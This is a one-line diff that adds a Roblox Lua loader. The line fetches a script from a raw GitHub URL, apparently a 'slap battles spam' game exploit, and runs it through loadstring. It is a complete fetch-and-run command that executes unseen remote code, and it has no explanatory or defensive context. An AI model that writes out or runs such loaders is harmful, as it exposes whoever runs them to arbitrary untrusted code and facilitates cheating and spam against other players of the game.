@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/update-slap-battles-spam2-7n2d1ccdj0ox1v.lua"))()
